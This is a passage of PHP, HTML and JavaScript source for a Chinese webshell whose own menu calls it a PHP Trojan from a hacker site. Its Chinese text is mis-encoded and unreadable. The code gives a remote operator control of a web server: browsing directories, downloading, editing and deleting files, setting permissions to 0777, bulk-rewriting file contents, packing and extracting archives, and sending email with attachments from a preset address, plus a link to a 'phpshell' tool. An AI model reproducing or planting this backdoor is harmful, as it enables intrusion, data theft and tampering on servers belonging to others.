   <td class="t22" width="14%" align=center>µ±Ç°Â·¾¶:</td><form method="get" action=""> <td width="56%"><input type="text" name="dir" size="32" value="<? echo"$dir";?>"> <input type="submit" value="Ìø×ª"> <a href="javascript:toExit('show','boy_email')" onMouseOut="nd();return true;" onMouseOver="drc('´ËÎªÌØÉ«¹¦ÄÜ£¬Îñ±ØÏÈÑ¡ºÃÄãÒª·¢ËÍµÄÎÄ¼þ','·¢ËÍ´ø¸½¼þµÄemail');return true;" >¡¾<font color="#FF0D85">Email·¢ËÍ</font>¡¿</a><? if($viwe!=img)
   echo"<a href=?dir={$dir}&viwe=img onMouseOut=\"nd();return true;\" onMouseOver=\"drc('ä¯ÀÀµ±Ç°ËùÓÐÍ¼Æ¬','Í¼Æ¬ä¯ÀÀÆ÷');return true;\" >¡¾<font color=#FF0D85>µ±Ç°Í¼Æ¬</font>¡¿</a>";
     else echo"<a href=?dir={$dir} onMouseOut=\"nd();return true;\" onMouseOver=\"drc('ä¯ÀÀµ±Ç°ËùÓÐÎÄ¼þÐÅÏ¢','ÎÄ¼þä¯·½Ê½');return true;\" >¡¾<font color=#FF0D85>µ±Ç°ÎÄ¼þ</font>¡¿</a>";?>
   </td></form>
   </tr>
   <tr class="t21">
   <td class="t22" width="14%" align=center>¾ø¶ÔÄ¿Â¼:</td><form method="get" action="">
   <td width="56%"><?php $temp_show_url=$pathname ;$temp_show_url.="/".rawurldecode($temp);
   echo "<a href=?dir=./><font color=red>$pathname</font></a>";
   $url_hrefs=explode("/",$dir);
   for($i=1;$i<count($url_hrefs);$i++)
   {$url_href_tmp.="/".$url_hrefs[$i];
   echo "/<a href=?dir=.$url_href_tmp><font color=#008AA6>$url_hrefs[$i]</font></a>";} ?></td></form>
   </tr>
   </table>
   <table width="750" cellspacing="0" cellpadding="1">
   <form action="?dir=<?=$dir?>" method="post" name=main>
   <script>
   <!--
   var checkflag=1;           //Ñ¡Ôñ±êÖ¾
   function rename(u,v,m,o,s)   //¸ù¾ÝÊäÈëµÄÐÅÏ¢Ìá½»,uÎª±íµ¥Ãû£¬vÎªÇëÇó·½Ê½
   {
     str=prompt(m,s)
     if(str!='ÇëÌîÐ´'&&str!=null){
         u.action=u.action+'&action='+v+'&oldname='+o+'&newname='+str;
         u.submit();
     }
   }
   function system(u,v,m,s)   //¸ù¾ÝÊäÈëµÄÐÅÏ¢Ìá½»,uÎª±íµ¥Ãû£¬vÎªÇëÇó·½Ê½
   {
     str=prompt(m,s)
     if(str!='ÇëÌîÐ´'&&str!=null){
         u.action=u.action+'&action='+v+'&key='+str;
         u.submit();
     }
   }
   function really(u,v,m)  //¸ù¾ÝÊäÈëµÄÐÅÏ¢Ìá½»,uÎª±íµ¥Ãû£¬vÎªÇëÇó·½Ê½£¬mÎªÏÔÊ¾µÄÐÅÏ¢
   {
     if(confirm(m)){
       u.action=u.action+'&action='+v;
       u.submit();
     }
   }
   function tools(u,v,m)  //¸ù¾ÝÊäÈëµÄÐÅÏ¢Ìá½»,uÎª±íµ¥Ãû£¬vÎªÇëÇó·½Ê½£¬mÎªÏÔÊ¾µÄÐÅÏ¢
   {
     if(confirm(m)){
       u.action=u.action+'&tools='+v;
       u.submit();
     }
   }
   function check(u) {
   if (checkflag ==1) {
   for (i = 0; i < u.length; i++) {
   u[i].checked = true;}
   checkflag =0;
   return "È«²¿²»Ñ¡"; }
   else {
   for (i = 0; i < u.length; i++) {
   u[i].checked = false; }
   checkflag =1;
   return "È«Ñ¡Ñ¡Ôñ"; }
   }
   -->
   </script><tr><td colspan="2" class=t21 align=center>
   <div id=file_replace style="HEIGHT: 80px; LEFT: 75px; POSITION: absolute; TOP: 40px; VISIBILITY: hidden; WIDTH: 270px; Z-INDEX: 1">
   <table bgcolor=#CCCC00 border=1 cellpadding=0 cellspacing=0 height=80 width=270>
   <tbody> <tr> <td height=65 width="80%"> <br> <font color=#ffffff>¡¡¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ<br>
         <font color=red>ÎÄ¼þ¹Ø¼ü×ÖÌæ»»:</font><br>
          ¹Ø¼ü×ÖÌæ»»:
      <input type=text name=count value=5 size=2>  <input type=button onclick=setid3(); value=Ìæ»»¸öÊý>
   <div id=rep>01<textarea name="oldkeys[]" cols="14" rows="4"></textarea> ¡ú¡ú <textarea name="newkeys[]" cols="14" rows="4"></textarea><br></div>¡¡ <input type="button" value="È·ÈÏÌæ»»" onclick="really(this.form,'file_replace_keyword','ÄãÈ·ÈÏÒªÌæ»»Âð£¿²Ù×÷ºó¿ÉÊÇ²»ÄÜ»Ö¸´µÄ£¬½¨ÒéÄãÏÈ×ö±¸·Ý')">¡¡<input type="reset" name="button" value="ÖØÖÃ"> <br><br>¡¡ <input type="button" value="È·ÈÏ²éÕÒ" onclick="really(this.form,'file_replace_find','ÄãÈ·ÈÏÒª²éÕÒÂð£¿')">
   <b></b></font></td> </tr>
   <tr align="center"> <td height=23 width="100%"><a href="javascript:toExit('hide','file_replace')"><font color=red>¹Ø±Õ´Ë´°¿Ú</font></a></td></tbody> </table>
   </div>

   <div id=boy_email
    style="HEIGHT: 80px; LEFT: 75px; POSITION: absolute; TOP: 40px; VISIBILITY: hidden; WIDTH: 270px; Z-INDEX: 1">
   <table bgcolor=#CCCC00 border=1 cellpadding=0 cellspacing=0 height=80 width=270><table bgcolor=#CCCC00 border=1 cellpadding=0 cellspacing=0 height=80 width=270><tr><td height=65 width="100%"><font color=#ffffff>
   <br>¡¡¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ<br><font color=red>¡¡Email·¢ËÍ:</font><br>
   ¡¡¡¡·¢ËÍµ½£º<input name=to type=text value=''size=24><br>
   ¡¡¡¡·¢ËÍÕß£º<input name=from type=text value='jack3240782@163.com'size=24><br>
   ¡¡¡¡±ê¡¡Ìâ£º<input name=subject type=text value=''size=24><br>
   ¡¡¡¡ÄÚ¡¡ÈÝ£º<textarea name="body" cols="24" rows="4"></textarea><br>
   ¡¡¡¡html·½Ê½<input type="checkbox" class=chcekbox name="T_type" value="1">¡¡¡¡<input type="button" value="·¢ËÍ" onclick="really(this.form,'email','È·ÈÏ·¢ËÍ¸ÃÓÊ¼þÂð£¿')">¡¡<input type="reset" name="Submit2" value="ÖØÖÃ"><br>
   </font><br><br><a href="javascript:toExit('hide','boy_email')"><font color=red>¹Ø±Õ´Ë´°¿Ú</font></a></td></tr></table></div>

   <style type=text/css>
   table        { font-size: 9pt; cursor: default; margin: 0 }

   tr.over      { font-size: 9pt; color: #000000; background-color: #cccccc; cursor: default }
   tr.out       { font-size: 9pt; color: #000000; background-color: #ffffff; cursor: default }
   div.rm_div   { position: absolute; filter: Alpha(Opacity='95'); display: none;
                  background-color: #ffffff; width: 0; height: 0;
                  border: 1px outset #cccccc }
   hr.sperator  { border: 1px inset #cccccc }
   </style>
   <script>
    function RightMenu()
     {
       this.AddExtendMenu=AddExtendMenu;
       this.AddItem=AddItem;
       this.GetMenu=GetMenu;
       this.HideAll=HideAll;
       this.I_OnMouseOver=I_OnMouseOver;
       this.I_OnMouseOut=I_OnMouseOut;
       this.I_OnMouseUp=I_OnMouseUp;
       this.P_OnMouseOver=P_OnMouseOver;
       this.P_OnMouseOut=P_OnMouseOut;
       A_rbpm = new Array();
       HTMLstr  = "";
       HTMLstr += "<!-- RightButton PopMenu -->\n";
       HTMLstr += "\n";
       HTMLstr += "<!-- PopMenu Starts -->\n";
       HTMLstr += "<div id='E_rbpm' class='rm_div'>\n";
                           // rbpm = right button pop menu
       HTMLstr += "<table style='border: 2 solid #FFFFFF' width='100%' border='0' cellspacing='0'>\n";
       HTMLstr += "<!-- Insert A Extend Menu or Item On Here For E_rbpm -->\n";
       HTMLstr += "</table>\n";
       HTMLstr += "</div>\n";
       HTMLstr += "<!-- Insert A Extend_Menu Area on Here For E_rbpm -->";
       HTMLstr += "\n";
       HTMLstr += "<!-- PopMenu Ends -->\n";
     }
     function AddExtendMenu(id,name,parent)
     {
       var TempStr = "";
       if(HTMLstr.indexOf("<!-- Extend Menu Area : E_"+id+" -->") != -1)
       {
         alert("E_"+id+"already exist!");
         return;
       }
       eval("A_"+parent+".length++");
       eval("A_"+parent+"[A_"+parent+".length-1] = id");  // ½«´ËÏî×¢²áµ½¸¸²Ëµ¥ÏîµÄIDÊý×éÖÐÈ¥
       TempStr += "<!-- Extend Menu Area : E_"+id+" -->\n";
       TempStr += "<div id='E_"+id+"' class='rm_div'>\n";
       TempStr += "<table style='border: 2 solid #FFFFFF' width='100%' border='0' cellspacing='0'>\n";
       TempStr += "<!-- Insert A Extend Menu or Item On Here For E_"+id+" -->";
       TempStr += "</table>\n";
       TempStr += "</div>\n";
       TempStr += "<!-- Insert A Extend_Menu Area on Here For E_"+id+" -->";
       TempStr += "<!-- Insert A Extend_Menu Area on Here For E_"+parent+" -->";
       HTMLstr = HTMLstr.replace("<!-- Insert A Extend_Menu Area on Here For E_"+parent+" -->",TempStr);


       eval("A_"+id+" = new Array()");
       TempStr  = "";
       TempStr += "<!-- Extend Item : P_"+id+" -->\n";
       TempStr += "<tr id='P_"+id+"' class='out'";
       TempStr += " onmouseover='P_OnMouseOver(\""+id+"\",\""+parent+"\")'";
       TempStr += " onmouseout='P_OnMouseOut(\""+id+"\",\""+parent+"\")'";
       TempStr += " onmouseup=window.event.cancelBubble=true;";
       TempStr += " onclick=window.event.cancelBubble=true;";
       TempStr += "><td nowrap>";
       TempStr += "   "+name+"      </td><td style='font-family: webdings; text-align: right; height: 20'>4";
       TempStr += "</td></tr>\n";
       TempStr += "<!-- Insert A Extend Menu or Item On Here For E_"+parent+" -->";
       HTMLstr = HTMLstr.replace("<!-- Insert A Extend Menu or Item On Here For E_"+parent+" -->",TempStr);
     }
     function AddItem(id,name,parent,location)
     {
       var TempStr = "";
       var ItemStr = "<!-- ITEM : I_"+id+" -->";
       if(id == "sperator")
       {
         TempStr += ItemStr+"\n";
         TempStr += "<tr style='height: 3;' class='out' onclick='window.event.cancelBubble=true;' onmouseup='window.event.cancelBubble=true;'><td height = '10' colspan='2'><hr size='1'></td></tr>";
         TempStr += "<!-- Insert A Extend Menu or Item On Here For E_"+parent+" -->";
         HTMLstr = HTMLstr.replace("<!-- Insert A Extend Menu or Item On Here For E_"+parent+" -->",TempStr);
         return;
       }
       if(HTMLstr.indexOf(ItemStr) != -1)
       {
         alert("I_"+id+"already exist!");
         return;
       }
       TempStr += ItemStr+"\n";
       TempStr += "<tr id='I_"+id+"' class='out'";
       TempStr += " onmouseover='I_OnMouseOver(\""+id+"\",\""+parent+"\")'";
       TempStr += " onmouseout='I_OnMouseOut(\""+id+"\")'";
       TempStr += " onclick='window.event.cancelBubble=true;'";
       if(location == null)
         TempStr += " onmouseup='I_OnMouseUp(\""+id+"\",\""+parent+"\",null)'";
       else
   {if(location == "Do")
         TempStr += " onmouseup='I_OnMouseUp(\""+id+"\",\""+parent+"\",\"Do\")'";
       else
         TempStr += " onmouseup='I_OnMouseUp(\""+id+"\",\""+parent+"\",\""+location+"\")'";}
       TempStr += "><td nowrap>";
       TempStr += "   "+name+"   ";
       TempStr += "</td><td height = '20'></td></tr>\n";
       TempStr += "<!-- Insert A Extend Menu or Item On Here For E_"+parent+" -->";
       HTMLstr = HTMLstr.replace("<!-- Insert A Extend Menu or Item On Here For E_"+parent+" -->",TempStr);
     }
     function GetMenu()
     {
       return HTMLstr;
     }
     function I_OnMouseOver(id,parent)
     {
       var Item;
       if(parent != "rbpm")
       {
         var ParentItem;
         ParentItem = eval("P_"+parent);
         ParentItem.className="over";
       }
       Item = eval("I_"+id);
       Item.className="over";
       HideAll(parent,1);
     }
     function I_OnMouseOut(id)
     {
       var Item;
       Item = eval("I_"+id);
       Item.className="out";
     }
     function I_OnMouseUp(id,parent,location)
     {
       var ParentMenu;
       window.event.cancelBubble=true;
       OnClick();
       ParentMenu = eval("E_"+parent);
       ParentMenu.display="none";
       if(location == "Do")
         eval("Do_"+id+"()");
       else {if(location == null) ;else window.location=location;}
     }
     function P_OnMouseOver(id,parent)
     {
       var Item;
       var Extend;
       var Parent;
       if(parent != "rbpm")
       {
         var ParentItem;
         ParentItem = eval("P_"+parent);
         ParentItem.className="over";
       }
       HideAll(parent,1);
       Item = eval("P_"+id);
       Extend = eval("E_"+id);
       Parent = eval("E_"+parent);
       Item.className="over";
       Extend.style.display="block";
       Extend.style.posLeft=document.body.scrollLeft+Parent.offsetLeft+Parent.offsetWidth-4;
       if(Extend.style.posLeft+Extend.offsetWidth > document.body.scrollLeft+document.body.clientWidth)
           Extend.style.posLeft=Extend.style.posLeft-Parent.offsetWidth-Extend.offsetWidth+8;
       if(Extend.style.posLeft < 0) Extend.style.posLeft=document.body.scrollLeft+Parent.offsetLeft+Parent.offsetWidth;
       Extend.style.posTop=Parent.offsetTop+Item.offsetTop;
       if(Extend.style.posTop+Extend.offsetHeight > document.body.scrollTop+document.body.clientHeight)
         Extend.style.posTop=document.body.scrollTop+document.body.clientHeight-Extend.offsetHeight;
       if(Extend.style.posTop < 0) Extend.style.posTop=0;
     }
     function P_OnMouseOut(id,parent)
     {
     }
     function HideAll(id,flag)
     {
       var Area;
       var Temp;
       var i;
       if(!flag)
       {
         Temp = eval("E_"+id);
         Temp.style.display="none";
       }
       Area = eval("A_"+id);
       if(Area.length)
       {
         for(i=0; i < Area.length; i++)
         {
           HideAll(Area[i],0);
           Temp = eval("E_"+Area[i]);
           Temp.style.display="none";
           Temp = eval("P_"+Area[i]);
           Temp.className="out";
         }
       }
     }

     document.onmouseup=OnMouseUp;
     document.onclick=OnClick;
     function OnMouseUp()
     {
       if(window.event.button == 2)
       {
         var PopMenu;
         PopMenu = eval("E_rbpm");
         HideAll("rbpm",0);
         PopMenu.style.display="block";
         PopMenu.style.posLeft=document.body.scrollLeft+window.event.clientX;
         PopMenu.style.posTop=document.body.scrollTop+window.event.clientY;
         if(PopMenu.style.posLeft+PopMenu.offsetWidth > document.body.scrollLeft+document.body.clientWidth)
           PopMenu.style.posLeft=document.body.scrollLeft+document.body.clientWidth-PopMenu.offsetWidth;
         if(PopMenu.style.posLeft < 0) PopMenu.style.posLeft=0;
         if(PopMenu.style.posTop+PopMenu.offsetHeight > document.body.scrollTop+document.body.clientHeight)
           PopMenu.style.posTop=document.body.scrollTop+document.body.clientHeight-PopMenu.offsetHeight;
         if(PopMenu.style.posTop < 0) PopMenu.style.posTop=0;
       }
     }
     function OnClick()
     {
       HideAll("rbpm",0);
     }
     // Add Your Function on following
     function Do_replay_box() { toExit('show','file_replace');}
     function Do_viewcode(){window.location="view-source:"+window.location.href;}
     function Do_exit() {window.close();}
     function Do_refresh() {window.location.reload();}
     function Do_back() {history.back();}
     function Do_forward() {history.forward();}

     var menu = new RightMenu();
     menu.AddItem("meun","webadmin²Ù×÷²Ëµ¥","rbpm",null);
     menu.AddItem("slect","<input type=button value=È«²¿Ñ¡Ôñ onclick='this.value=check(this.form)'>","rbpm",null);
     menu.AddItem("copy_cut_past","<input type=button value=¼ôÇÐ onclick=\"really(this.form,'cut','ÄãÈ·ÈÏÒª¼ôÇÐËùÑ¡ÎÄ¼þÂð')\"><input type=button value=¸´ÖÆ onclick=\"really(this.form,'copy','ÄãÈ·ÈÏÒª¸´ÖÆËùÑ¡ÎÄ¼þÂð')\"><input type=button value=Õ³Ìù onclick=\"really(this.form,'parse','ÄãÈ·ÈÏ¼ôÇÐ°æÎÄ¼þÔÚ´ËÕ³ÌùÂð')\">","rbpm",null);
    menu.AddItem("del_cho","<input type=button value=É¾³ý onclick=\"really(this.form,'delete','ÄãÈ·ÈÏÒªÉ¾³ýËùÑ¡ÎÄ¼þÂð')\"><input type=button value=ÐÞ¸ÄÊôÐÔ onclick=\"system(this.form,'editperming','ÇëÌîÐ´ÄãÒª¸ÄµÄÊôÐÔ Èç: 0777.0755.0666£¨Ò»¶¨ÎªÊý×Ö£©','0777')\">","rbpm",null);
     menu.AddExtendMenu("tozip","1.¶àÖÖ¸ñÊ½´ò°ü/Ñ¹Ëõ","rbpm");
       menu.AddItem("zip","<input type=button value=zip¸ñÊ½Ñ¹Ëõ onclick=\"system(this.form,'zip','ÇëÌîÐ´ÄãÒªÑ¹ËõµÄÎÄ¼þÃû','newzip.zip')\">","tozip",null);
       menu.AddItem("tar","<input type=button value=tar¸ñÊ½´ò°ü onclick=\"system(this.form,'tgz','ÇëÌîÐ´ÄãÒªÑ¹ËõµÄÎÄ¼þÃû£¬ÎÄ¼þÃû.tar','<?php echo "$dir/ÎÄ¼þÃû.tar"; ?>')\">","tozip",null);
       menu.AddItem("tgz","<input type=button value=tgz¸ñÊ½Ñ¹Ëõ onclick=\"system(this.form,'tgz','ÇëÌîÐ´ÄãÒªÑ¹ËõµÄÎÄ¼þÃû£¬[ÎÄ¼þÃû.tar.gz]»òÕß[ÎÄ¼þÃû.tgz]','<?php echo "$dir/ÎÄ¼þÃû.tar.gz"; ?>')\">","tozip",null);
       menu.AddItem("wlc","<input type=button value=wlc·½Ê½´ò°ü onclick=\"system(this.form,'wlczip','ÇëÌíÈëÄãÒªÑ¹ËõµÄÎÄ¼þµØÖ·ºÍÃû×Ö','<?php echo "$dir/data.wlc" ;?>')\">","tozip",null);
     menu.AddExtendMenu("deal_for_zip","2.¶ÔÑ¹ËõÎÄ¼þ´¦Àí","rbpm");
       menu.AddItem("view_zip","<input type=button value=zip¸ñÊ½ä¯ÀÀ onclick=\"really(this.form,'viewzip','ÄãÈ·¶¨ËùÑ¡ÎÄ¼þÎªZIPÎÄ¼þÂð£¿')\">","deal_for_zip",null);
       menu.AddItem("unzip","<input type=button value=½âÑ¹/½â°ü onclick=\"system(this.form,'extract','ÇëÈ·¶¨ËùÑ¡ÎÄ¼þÎªZIPÎÄ¼þ£¬²¢ÌîÐ´ÄãÒª½âÑ¹µÄÄ¿Â¼','<?=$dir?>')\">","deal_for_zip",null);
     menu.AddExtendMenu("file_key_replace","3.ÅúÁ¿×Ö·û×ª»»","rbpm");
       menu.AddItem("replace_box","<a href=JavaScript:toExit('show','file_replace') >¹Ø¼ü×ÖÌæ»»</a>","file_key_replace",null);
              menu.AddItem("gb_big5","<input type=button value=¼òÌå¡ú·±Ìå onclick=\"really(this.form,'file_replace_gb_2_big5','ÄãÈ·ÈÏÒª[¼òÌå¡ú·±Ìå]Âð£¿ÕâÊÇºÜÎ£ÏÕµÄ£¬½¨Òé±¸·Ý')\">","file_key_replace",null);
              menu.AddItem("big5_gb","<input type=button value=·±Ìå¡ú¼òÌå onclick=\"really(this.form,'file_replace_big5_2_gb','ÄãÈ·ÈÏÒª[·±Ìå¡ú¼òÌå]Âð£¿ÕâÊÇºÜÎ£ÏÕµÄ£¬½¨Òé±¸·Ý')\">","file_key_replace",null);
              menu.AddItem("gb_utf8","<input type=button value=¼òÌå¡úUTF-8 onclick=\"really(this.form,'file_replace_gb_2_utf8','ÄãÈ·ÈÏÒª[¼òÌå¡úUTF-8]Âð£¿ÕâÊÇºÜÎ£ÏÕµÄ£¬½¨Òé±¸·Ý')\">","file_key_replace",null);
     menu.AddExtendMenu("ÌØÊâ¹¤¾ß","4.ÌØÊâ¹¤¾ß","rbpm");
       menu.AddItem("phpshell","phpshell","ÌØÊâ¹¤¾ß","?tools=phpshell");
       menu.AddItem("showh","<input type=button value=³ÌÐò´úÂë²é¿´ onclick=\"tools(this.form,'showh','ÄãÒª²é¿´¸ÃÎÄ¼þ³ÌÐòÂð£¿ÏÈÈ·ÈÏÖ»Ñ¡ÔñÒ»¸öÎÄ¼þ£¡')\">","ÌØÊâ¹¤¾ß",null);
   menu.AddItem("sperator","","rbpm",null);
     menu.AddItem("author","¹ØÓÚºÚ¿ÍÖ®¼ÒphpÄ¾Âí v1.0","rbpm","http://www.52hack.cn");
     document.writeln(menu.GetMenu());
   </script>

   <!-²Ù×÷Ñ¡Ïî£º-->
            <input type="button" value="È«²¿Ñ¡Ôñ" onclick="this.value=check(this.form)" class=op>
            <input type="button" value="¼ôÇÐ" onclick="really(this.form,'cut','ÄãÈ·ÈÏÒª¼ôÇÐËùÑ¡ÎÄ¼þÂð')" class=op>
            <input type="button" value="¸´ÖÆ" onclick="really(this.form,'copy','ÄãÈ·ÈÏÒª¸´ÖÆËùÑ¡ÎÄ¼þÂð')" class=op>
            <input type="button" value="Õ³Ìù" onclick="really(this.form,'parse','ÄãÈ·ÈÏ¼ôÇÐ°æÎÄ¼þÔÚ´ËÕ³ÌùÂð')" class=op>
            <input type="button" value="É¾³ý" onclick="really(this.form,'delete','ÄãÈ·ÈÏÒªÉ¾³ýËùÑ¡ÎÄ¼þÂð')" class=op>
            <input type="button" value="ÐÞ¸ÄÊôÐÔ" onclick="system(this.form,'editperming','ÇëÌîÐ´ÄãÒª¸ÄµÄÊôÐÔ Èç: 0777.0755.0666£¨Ò»¶¨ÎªÊý×Ö£©','0777')" class=op>
            <input type="button" value="zipÑ¹Ëõ" onclick="system(this.form,'zip','ÇëÌîÐ´ÄãÒªÑ¹ËõµÄÎÄ¼þÃû','ÎÄ¼þÃû.zip')" class=op>
            <input type="button" value="zipä¯ÀÀ" onclick="really(this.form,'viewzip','ÄãÈ·¶¨ËùÑ¡ÎÄ¼þÎªZIPÎÄ¼þÂð£¿')" class=op>
            <input type="button" value="tar´ò°ü" onclick="system(this.form,'tgz','ÇëÌîÐ´ÄãÒªÑ¹ËõµÄÎÄ¼þÃû£¬ÎÄ¼þÃû.tar.gz','<?php echo "$dir/ÎÄ¼þÃû.tar"; ?>')" class=op>
            <input type="button" value="tgzÑ¹Ëõ" onclick="system(this.form,'tgz','ÇëÌîÐ´ÄãÒªÑ¹ËõµÄÎÄ¼þÃû£¬[ÎÄ¼þÃû.tar.gz]»òÕß[ÎÄ¼þÃû.tgz]','<?php echo "$dir/ÎÄ¼þÃû.tar.gz"; ?>')" class=op>
            <input type="button" value="wlc´ò°ü" onclick="system(this.form,'wlczip','ÇëÌíÈëÄãÒªÑ¹ËõµÄÎÄ¼þµØÖ·ºÍÃû×Ö','<?php echo "$dir/data.wlc" ;?>')" class=op>
            <input type="button" value="½âÑ¹/½â°ü" onclick="system(this.form,'extract','ÇëÈ·¶¨ËùÑ¡ÎÄ¼þÎªzip,tar,tar.gz,tgz,wlcÎåÖÖ¸ñÊ½ÖÐµÄÒ»ÖÖ£¬²¢ÌîÐ´ÄãÒª½âÑ¹µÄÄ¿Â¼','<?=$dir?>')" class=op>
   </td>
   </tr>
   </table>
   <table class="t1" width="750" cellspacing="1" cellpadding="1" height=270>
   <tr class="t21" valign=top>
   <td width="30%">
   <table width="100%" cellspacing="0" cellpadding="0">
   <tr  class="t22" align=center valign=middle>
   <td width="70%" valign=left>¡¡Ä¿Â¼Ãû³Æ¡¡<input type="button" value="ÐÂ½¨Ä¿Â¼" onclick="system(this.form,'mkdir','ÇëÌîÐ´ÄãÒªÐÂ½¨µÄÄ¿Â¼Ãû','newdir')"></td><td width="15%">ÊôÐÔ</td> <td width="15%">²Ù×÷</td></tr>
   </table>
   <?php
   list($a1,$a2) = split ("/", $dir, 2);//ÅÐ¶ÏÓÐÃ»ÓÐ"."
   if(!$a1) $lastdir="";else $lastdir=".";
   $lastdirs=explode("/",$dir);
   for($i=1;$i<count($lastdirs)-1;$i++) if($lastdirs[$i]!="") $lastdir.="/".$lastdirs[$i];
   if($dir!=".") echo "¡ü<a href='?dir=".rawurldecode($lastdir)."'> ÉÏ¼¶Ä¿Â¼</a>";
   @$dirs=opendir($dir);
   while (@$file=readdir($dirs)) {
       @$b="$dir/$file";
       @$a=is_dir($b);
       if($a=="1"){
           if($file!=".."&&$file!=".") {
               $fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
        if($show_owner){
          if (function_exists("posix_getpwuid")) {
            @$uid = @posix_getpwuid(@fileowner("$dir/$file"));
            @$owner = @$uid["name"];
         }
   if (function_exists("posix_getgrgid")) {
            $gid = @posix_getgrgid(@filegroup("$dir/$file"));
            @$group = $gid["name"];
         }}                        $file_num_mu++;//Ä¿Â¼ÊýÁ¿Í³¼Æ
               echo "<table width='100%' cellspacing='0' cellpadding='0' onMouseOut=\"this.bgColor='#D9F5FF';\" onMouseOver=\"this.bgColor='#FBE5FA';\"> <tr> <td width='76%'><input type=\"checkbox\" class=chcekbox name=\"file[]\" value=\"$file\"><a href='?dir=$dir/$file' ";if($show_owner) echo"onMouseOut=\"nd();return true;\" onMouseOver=\"drc('','owner:{$owner}[".fileowner("$dir/$file")."]  <br>group:{$group}[".filegroup("$dir/$file")."]');return true;\"";echo "><font face=Wingdings color=#005E8C>1</font> $file</a></td> <td width='12%'><input type=button value=$fileperm onclick=\"location.href='?dir=$dir&fileperm=$file&tools=editfileperm'\"></td> <td width='12%'><input type=button value=¸ÄÃû onclick=\"rename(this.form,'rename','ÇëÊäÈëÐÂµÄÄ¿Â¼Ãû','$file','$file')\"></td></tr></table>";
           }
       }
   }
   @closedir($dirs);
   ?>
   </td> <td width="70%"> <table width="100%" cellspacing="0" cellpadding="0" class="tbldata">
   <? if($viwe!=img){
   echo '<tr class="t22" align=center valign=middle>  <td width="34%" valign=left>ÎÄ¼þÃû¡¡¡¡¡¡<input type="button" value="ÐÂ½¨ÎÄ¼þ" onclick="system(this.form,\'newfile\',\'ÇëÌîÐ´ÄãÒªÐÂ½¨µÄÎÄ¼þÃû\',\'newfile\')"></td> <td width="20%">ÈÕÆÚ</td> <td width="20%">´óÐ¡</td> <td width="6%">ÊôÐÔ</td> <td width="18%" colspan=3>²Ù×÷</td> </tr>';}
      else echo "";//Í¼Æ¬ÏÔÊ¾Ê±ÒªÏÔÊ¾µÄÎÄ×Ö
   ?>

   <?php
   @$dirs=opendir($dir);
   while (@$file=readdir($dirs)) {
       @$b="$dir/$file";
       @$a=is_dir($b);
       if($a=="0"&&$file!=".."){
           @$size=filesize("$dir/$file");
           @$size=$size/1024 ;
                        $Kb=Kb;
                        if($size>1024) {$size=$size/1024;$Kb=Mb;} ;
           @$size= number_format($size, 3);
           @$lastsave=date("Y-m-d H:i",filectime("$dir/$file"));
           @$fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
             if($show_owner){
          if (function_exists("posix_getpwuid")) {
            @$uid = @posix_getpwuid(@fileowner("$dir/$file"));
            @$owner = @$uid["name"];
         }
   if (function_exists("posix_getgrgid")) {
            $gid = @posix_getgrgid(@filegroup("$dir/$file"));
            @$group = $gid["name"];
         }}
             if($file!=@basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", $GLOBALS["PHP_SELF"])))
                       { $file_num++;//ÎÄ¼þÊýÁ¿Í³¼Æ
                         $filename_tmp = basename($file);
       $filetype_tmp=strtolower(substr($filename_tmp,strrpos($filename_tmp,".")));

                  if($viwe!=img){
           echo "<tr onMouseOut=\"this.bgColor='#D9F5FF';\" onMouseOver=\"this.bgColor='#FBE5FA';\"> <td width='50%'><input type=\"checkbox\" class=chcekbox name=\"file[]\" value=\"$file\"><a href=$temp";if($temp) echo "/";echo "".rawurlencode($file)."";if($show_owner) {
   if((substr($file, -4)=='.tgz')||substr($file, -4)=='.zip'||substr($file, -4)=='.wlc'||substr($file, -4)=='.tar'||substr($file, -7)=='.tar.gz') $canunzip="[".$file."]ÊÇ´ò°ü/Ñ¹ËõÎÄ¼þ£¬¿ÉÒÔÑ¡Ôñ[½âÑ¹/½â°ü]À´ÊÍ·Åµ½Ö¸¶¨Ä¿Â¼";else $canunzip="";
   echo " onMouseOut=\"nd();return true;\" onMouseOver=\"drc('$canunzip','owner:{$owner}[".fileowner("$dir/$file")."]  <br>group:{$group}[".filegroup("$dir/$file")."]');return true;\"";}echo " target=_blank><font face=Wingdings color=#00665E>2</font> $file</a> $isread </td> <td width='29%'>$lastsave</td> <td width='10%'><font color=#733900>$size</font>$Kb</td> <td width='5%'><input type=button value=$fileperm onclick=\"location.href='?dir=$dir&fileperm=$file&tools=editfileperm'\"></td> <td width='5%'><input type=button value=ÏÂÔØ onclick=\"window.open('?downfile=$dir/$file','','')\"></td> <td width='5%'><input type=button value=±à¼ onclick=\"location.href='?dir=$dir&editfile=$file&n=1'\"></td> <td width='5%'><input type=button value=¸ÄÃû onclick=\"rename(this.form,'rename','ÇëÊäÈëÐÂµÄÎÄ¼þÃû','$file','$file')\"></td> </tr>";}
                else {     //View picture
       if ($filetype_tmp=='.gif' || $filetype_tmp=='.jpg' || $filetype_tmp=='.jpge' || $filetype_tmp=='.png')
     {$file_img++;
     if(!(($file_img-1)%5)) echo "<tr>";
       //echo "<tr><td><img src=$temp";if($temp) echo "/";echo "".rawurlencode($file)."></td></tr>";
   echo "<TD bgcolor=\"#F7F7F7\" style=\"border: 1px solid #000000\" align=center><TABLE BORDER=\"0\" CELLPADDING=\"0\" CELLSPACING=\"0\" align=center><TBODY><TR align=\"top\"><TD colspan=\"2\" bgcolor=\"#F7F7F7\" align=center><CENTER>{$file}</CENTER></TD></TR><TR><TD width=80 colspan=2 align=center><CENTER><A href=$temp";if($temp) echo "/";echo "".rawurlencode($file)." target=_blank><IMG SRC=$temp";if($temp) echo "/";echo "".rawurlencode($file)." BORDER=0 width=80 ></A></CENTER></TD></TR></TBODY></TABLE></TD>";

   }
                       }
                                                        }
       }
   }
   @closedir($dirs);
   echo "</table></form></td></tr><tr class=t22><td>¡¡¡¡µ±Ç°Ä¿Â¼×ÜÊý£º$file_num_mu ¸ö</TD><td>¡¡¡¡µ±Ç°ÎÄ¼þ×ÜÊý£º$file_num ¸ö</TD></tr></table>";
   }
   }
   $pageendtime=microtime();
   $starttime=explode(" ",$pagestartime);
